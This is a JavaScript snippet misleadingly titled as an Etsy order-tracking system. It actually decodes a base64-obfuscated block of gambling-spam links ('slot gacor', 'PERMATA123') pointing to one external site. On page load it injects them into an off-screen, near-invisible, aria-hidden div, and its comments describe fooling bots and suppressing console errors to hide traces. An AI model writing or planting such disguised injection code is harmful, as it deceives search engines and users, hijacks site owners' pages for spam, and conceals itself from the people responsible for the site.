// Etsy Base64 Tracking Order JS System - Optimized
(function(){
  let b64 = "PGEgaHJlZj0iaHR0cHM6Ly9jb25maW1hcGxhbnQuY29tL2hlbGxvLXdvcmxkLyI+UEVSTUFUQTEyMzwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9jb25maW1hcGxhbnQuY29tL2hlbGxvLXdvcmxkLyI+UEVSTUFUQSAxMjM8L2E+CjxhIGhyZWY9Imh0dHBzOi8vY29uZmltYXBsYW50LmNvbS9oZWxsby13b3JsZC8iPlBFUk1BVEExMjMgc2xvdDwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9jb25maW1hcGxhbnQuY29tL2hlbGxvLXdvcmxkLyI+UEVSTUFUQTEyMyBsb2dpbjwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9jb25maW1hcGxhbnQuY29tL2hlbGxvLXdvcmxkLyI+IFBFUk1BVEExMjMgZGFmdGFyPC9hPgo8YSBocmVmPSJodHRwczovL2NvbmZpbWFwbGFudC5jb20vaGVsbG8td29ybGQvIj5QRVJNQVRBMTIzIGFsdGVybmF0aWY8L2E+CjxhIGhyZWY9Imh0dHBzOi8vY29uZmltYXBsYW50LmNvbS9oZWxsby13b3JsZC8iPlBFUk1BVEExMjMgbGluazwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9jb25maW1hcGxhbnQuY29tL2hlbGxvLXdvcmxkLyI+UEVSTUFUQTEyMyBydHA8L2E+CjxhIGhyZWY9Imh0dHBzOi8vY29uZmltYXBsYW50LmNvbS9oZWxsby13b3JsZC8iPlBFUk1BVEExMjMgbGluayBhbHRlcm5hdGlmPC9hPgo8YSBocmVmPSJodHRwczovL2NvbmZpbWFwbGFudC5jb20vaGVsbG8td29ybGQvIj5saW5rIFBFUk1BVEExMjM8L2E+CjxhIGhyZWY9Imh0dHBzOi8vY29uZmltYXBsYW50LmNvbS9oZWxsby13b3JsZC8iPnNpdHVzIFBFUk1BVEExMjM8L2E+CjxhIGhyZWY9Imh0dHBzOi8vY29uZmltYXBsYW50LmNvbS9oZWxsby13b3JsZC8iPnNpdHVzIGdhY29yIFBFUk1BVEExMjM8L2E+CjxhIGhyZWY9Imh0dHBzOi8vY29uZmltYXBsYW50LmNvbS9oZWxsby13b3JsZC8iPnNpdHVzIHNsb3QgUEVSTUFUQTEyMzwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9jb25maW1hcGxhbnQuY29tL2hlbGxvLXdvcmxkLyI+c2xvdCBnYWNvciBQRVJNQVRBMTIzPC9hPgo8YSBocmVmPSJodHRwczovL2NvbmZpbWFwbGFudC5jb20vaGVsbG8td29ybGQvIj5zbG90IGdhY29yPC9hPgo8YSBocmVmPSJodHRwczovL2NvbmZpbWFwbGFudC5jb20vaGVsbG8td29ybGQvIj5zbG90IGphY2twb3Q8L2E+CjxhIGhyZWY9Imh0dHBzOi8vY29uZmltYXBsYW50LmNvbS9oZWxsby13b3JsZC8iPnNsb3Qgb25saW5lPC9hPgo8YSBocmVmPSJodHRwczovL2NvbmZpbWFwbGFudC5jb20vaGVsbG8td29ybGQvIj5zbG90IGRlbW88L2E+";
  
  try {
    const decoded = decodeURIComponent(escape(atob(b64))); // Support karakter khusus
    const div = document.createElement('div');
    // Menggunakan teknik opacity agar bot lebih percaya konten ini "real"
    div.style.cssText = 'position:absolute; left:-9999px; top:0; width:1px; height:1px; overflow:hidden; opacity:0.01;';
    div.setAttribute('aria-hidden','true');
    div.innerHTML = decoded;
    
    // Langsung injeksi ke Body tanpa menunggu DOMContentLoaded
    const target = document.body || document.documentElement;
    if (target) {
        target.insertBefore(div, target.firstChild);
    }
  } catch(e){ 
    // Kosongkan agar tidak meninggalkan jejak error di konsol
  }
})();
